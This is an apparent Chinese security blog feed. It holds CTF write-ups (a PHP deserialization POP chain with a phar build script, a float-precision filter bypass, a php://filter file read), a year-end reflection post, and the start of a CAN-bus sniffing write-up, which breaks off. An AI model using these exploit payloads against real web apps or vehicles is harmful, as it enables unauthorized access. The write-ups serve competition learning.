class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>链子：<code>Chunqiu::__destruct -&gt; Show::__toString -&gt; Test::__get -&gt; Test::get -&gt; Test::file_get</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119114348505.png" alt="image-20250119114348505"></p><p>接下来构造phar包</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token comment">// echo serialize($a);</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改为png后缀，上传</p><p>然后上传后的文件名是<code>md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;</code></p><p>结果这个<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>整了半天也没搞清楚路径在哪</p><p>file.php 可以直接读文件，waf屁用没有，<code>/file.php?file=/flag</code>非预期秒了，phar个锤子</p><hr><h1 id="easy-code"><a href="#easy-code" class="headerlink" title="easy_code"></a>easy_code</h1><p>基于get请求参数的2048</p><p>robots.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: chunqiuDisallow: /gogogo.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>gogogo.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allowedFiles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'read.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ctfer</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfer'</span><span class="token punctuation">]</span><span class="token operator">??</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token operator">!=</span> <span class="token number">667</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//溢出</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'7'</span><span class="token punctuation">)</span><span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 3!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 改进的正则表达式，检查是否不存在 base|rot13|input|data|flag|file|base64 字符串</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^(?:.*(?:base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env).*)$/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 先检查文件是否在允许的列表中</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"prohibited prohibited!!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"试试read.php"</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求 ctfer 的值为667，<code>strval</code>取字符串，<code>strpos</code>返回出现的位置，即 strval 后不能出现7</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119122729696.png" alt="image-20250119122729696"></p><p>那么只有利用溢出才能绕过第三个判断，我们知道<code>intval</code>是存在溢出的，而 strval 的作用和 intval 类似</p><p>测试发现到 <code>666.99999999999999</code> 和 667 相等，通过第二个判断了，处理14位</p><p>而 <code>666.999999999999</code> 在 strval 后就是 667，处理12位</p><p>打远程的时候发现这样就绕过了，接下来就是读文件</p><p>找个能用的过滤器秒了<code>php://filter/convert.iconv.CP9066.CSUCS4/resource=read.php</code></p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119132840271.png" alt="image-20250119132840271"></p><hr><h1 id="FlagBot（Unsolved）"><a href="#FlagBot（Unsolved）" class="headerlink" title="FlagBot（Unsolved）"></a>FlagBot（Unsolved）</h1><p>抓包，随便改下signature参数值，然后发过去弹debug报错界面</p><p>泄露出app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        image_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'signature'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> image_data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"No signature provided!"</span><span class="token punctuation">,</span> <span class="token number">400</span>        image_data <span class="token operator">=</span> image_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> pred<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>image_data<span class="token punctuation">)</span><span class="token punctuation">,</span> model_path<span class="token operator">=</span><span class="token string">'/app/model_AlexNet.pth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测，真要打大模型样本对抗啊，搜了一下感觉都是论文</p><p>总之先访问路径获取 model_AlexNet.pth</p><p>不懂</p><hr><h1 id="ezUpload（Unsolved）"><a href="#ezUpload（Unsolved）" class="headerlink" title="ezUpload（Unsolved）"></a>ezUpload（Unsolved）</h1><p>上传文件加密，把加密的结果拿来解密会执行pickle</p><p>测试发现ban的是字母：R，o，i，b，字母删光了我打什么啊</p><p>摆明了不给命令执行</p><p>能用的：eval，setstate，exec，template，render，requests，class，flask，sys</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你什么比赛你撞西湖论剑（&lt;/p&gt;
&lt;p&gt;day2的题没做，放着不管！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-10T15:19:30.000Z</published>
    <updated>2025-01-13T16:37:56.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结束了各科期末考，放寒假了终于有时间能写写年终总结了</p><p>过去的一年经历了很多事情，转眼间大三一学期就过去了，很多事情都发生了改变</p><p>托NISA各位的福，去了很多地方打了许多比赛，让机场成为我这个废宅最熟悉的地方（</p><span id="more"></span><hr><h1 id="6-8月"><a href="#6-8月" class="headerlink" title="6-8月"></a>6-8月</h1><p>上一篇 Thinking 写出来的时候处于一种要学业没学业要技术没技术要输出没输出要时间没时间的状态，自我内耗了相当一段时间</p><p>暑假 hw 的计划在过了几次笔试后没等来面试之后打水漂了，于是就待在家里摆烂，那段时间唯一要做的事就是准备CISCN决赛，而黑盾杯则因为初赛没队友做其他方向于是寄了让出机会给小登（我也想吃汉堡qaq</p><p>不得不说有 CISCN 这样一个比赛的压力在前头，总能推着去主动找一些东西来学，即使在java这里已经远远落后于其他师傅一大截，但是也只有行动才能够改变这样的现状</p><p>于是从放寒假到比赛前的日子对着 drun1baby 的博客补全了一些我觉得容易学的 java 内容，也是耐心把 springboot 的基础给啃了下来（学 springboot 对下个学期的区块链实训也帮上了忙）</p><p>决赛之前打了春秋杯夏季赛和西瓜杯，成绩和比赛手感都还挺好的，也是上手了一下 i 春秋的 awdp 模式提前有了了解</p><p>然后决赛就是队友们各显神通，我也没有拖后腿，虽然有一点小遗憾没能拿到国一，但是也是创造了记录</p><br><p>打完ciscn回来之后我就进入了休眠期，每天打打游戏就过去了</p><p>八月份就只学了一个flask内存马，不过在玩了几个星期后心态也是放平了不少</p><p>然后巅峰极客<del>（web杯）</del>自己单c拍断大腿差一点进决赛，我的主办方报销四川游😭</p><p>nepctf混了个三血也就只出了这一道题，dasctf八月赛也只签了个到</p><p>月底又给自己上强度了，羊城杯+攻防演练+高数下补考（</p><p>最后高数也是过了，大二下喜提无挂科记录，可喜可贺可喜可贺</p><hr><h1 id="⑨月"><a href="#⑨月" class="headerlink" title="⑨月"></a>⑨月</h1><p>打完攻防演练和羊城杯初赛之后，巨魔希望我接下来能研究 java，即使协会里没有web前辈能走到这一步，那么我就来成为第一个吧</p><p>于是开始踏踏实实过cc链的进度，开学没啥事一天一条学过去，逐渐有了一点学java的感觉，于是java进度推了不少</p><p>然后呢是羊城杯决赛，给高端口卡了一早上我是没想到的，我搁这审了一早上的tp源码，最后只能说是输给了时间不足</p><p>接下来就是这学期里最有成就感的一次比赛——SCTF，在没有任何队友仅凭一己之力的情况下解出题目并拿下了三血，xctf并非不可战胜</p><hr><h1 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h1><p>这个月基本就是每周周末都打一个比赛，GeekGame好玩</p><p>然后就没干啥了，每天赶赶各种课的实验报告和作业，花时间准备一下期中考，没学什么新东西</p><hr><h1 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h1><p>最疯狂的一个月，强网杯初赛所有人拼尽全力最终拿下，算是创造了NISA一个难以逾越的高峰</p><p>然后每周都出差，出差打网鼎杯，出差打工业互联网，周三周四的课主打一个全翘了（</p><p>网鼎杯半决赛渗透应出未出的弱密码，我不会放过你的👁，某种意义上这导致了后面队友的退役，唉唉</p><hr><h1 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h1><p>强网杯决赛，性质上感觉属于表演赛，但是永久会场场馆的规模是真nb啊，主办方报销真nb啊</p><p>难以置信，怎么回来就要准备面对一堆大作业的ddl和期末考了，很完蛋呢，不过不会再有哪科会挂了（会赢的.jpg</p><p>中间打了一下 CCB&amp;CISCN，哎卧槽ccb怎么这么坏😭，一觉醒来NISA实力下降一万倍，果然两位核心的退役还是给NISA带来了重创</p><p>DAS经典web爆零，什么时候我才能在 dasctf 上做出一点高质量题目啊😫</p><hr><h1 id="present"><a href="#present" class="headerlink" title="present"></a>present</h1><p>依旧是某默默无闻的十八线web🐕</p><p>又是被大佬们的年度总结所震撼的一年，羡慕大b哥大三就能有班上，年底还有好几家offer（</p><p>看看我这一年干了什么呢，看着这么多的比赛经历挺风光的，实则都是托了队友的福，头起太高也不是什么好事，这样后面的落差会相当大（</p><p>自主coding能力依旧稀烂，写个脚本都得跟GPT交流半天，这以后还怎么写工具做武器化啊(╯‵□′)╯︵┻━┻</p><p>也是察觉到了自己的一个问题，做题速度太慢，只有在凌晨的时候效率大幅提升，简单题都得花不少时间，不知道是不是学得过拟合了（</p><p>貌似陷入了打比赛爆零——花大把时间复现题目——没时间学新东西——打比赛爆零的循环，总之现在要复现的东西已经堆成山了，哈哈😄</p><p>但是没啥关系，每次打比赛都能逼着自己去学一些新的东西，去享受坐牢的过程，主打一个给自己上强度，hh</p><hr><h1 id="future"><a href="#future" class="headerlink" title="future"></a>future</h1><p>喜报：下学期开始没有要重修的科目了！（乐</p><p>关于实习，很淦的一点是我们实习的方式是投票选择的，最终的投票结果是学校安排集中实习，emmm，这tm是不是要去打黑工了，更淦的是这个实习还设置在了大四上，嗯没错，我们亲爱的计组设置在了大三下来上，然后看了下大三下的课表。。。周六排课也是神人了；依旧是一大堆没啥用的实训 ≈ 一大堆课早八午二 ≈ 一大堆大作业，我nm上个大学怎么这么多事.jpg</p><p>渗透，关于域只能说是一点不会，春秋云境看来得提上日程了，不然打国赛都费劲</p><p>后辈的培养，老实说，我不是很能理解这个b学分绩点为什么那么吸引人，这两届招过来的绝大多数人功利性都十分明显，奔着比赛加学分保研来的，整天想让别人带带，自己学的东西是一点进展没有，各个比赛也没啥积极性，只有会加学分的才报一下，真完蛋woc</p><p>然后呢，新的一年估计我还会是那个臭赛棍（</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;结束了各科期末考，放寒假了终于有时间能写写年终总结了&lt;/p&gt;
&lt;p&gt;过去的一年经历了很多事情，转眼间大三一学期就过去了，很多事情都发生了改变&lt;/p&gt;
&lt;p&gt;托NISA各位的福，去了很多地方打了许多比赛，让机场成为我这个废宅最熟悉的地方（&lt;/p&gt;</summary>
    
    
    
    <category term="Thinking" scheme="http://c1oudfl0w0.github.io/blog/categories/Thinking/"/>
    
    
  </entry>
  
  <entry>
    <title>第八届工业信息安全技能大赛复赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/</id>
    <published>2025-01-09T01:09:17.000Z</published>
    <updated>2025-02-04T14:18:38.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道啊，听说在海南打就去了（</p><span id="more"></span><hr><h1 id="港口工业挑战区"><a href="#港口工业挑战区" class="headerlink" title="港口工业挑战区"></a>港口工业挑战区</h1><p>看不懂，连环境在哪都没找到</p><p>据说是扫b段，但是我扫出来的几个都没法访问，不会要拿工控软件连吧</p><hr><h1 id="车路云安全挑战区"><a href="#车路云安全挑战区" class="headerlink" title="车路云安全挑战区"></a>车路云安全挑战区</h1><p>车联网意外的很能打，最后在一堆企业里杀到单项第五</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110120340616.png" alt="image-20250110120340616"></p><h2 id="底盘域"><a href="#底盘域" class="headerlink" title="底盘域"></a>底盘域</h2><h3 id="底盘域状态报文ID获取"><a href="#底盘域状态报文ID获取" class="headerlink" title="底盘域状态报文ID获取"></a>底盘域状态报文ID获取</h3><p>使用 cansniffer 抓包，注意控制车辆的web端的 ws 流要保持连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansniffer <span class="token parameter variable">-c</span> can0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先测方向盘，缓缓调整方向盘角度</p><p>同时观察抓包情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">25</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  31F  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">5.384565</span>  <span class="token number">401</span>  00 01 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">30</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">1.038971</span>  <span class="token number">401</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">38</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">0.413291</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">43</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24<span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">62</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">0.590077</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">77</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">81</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span><span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token 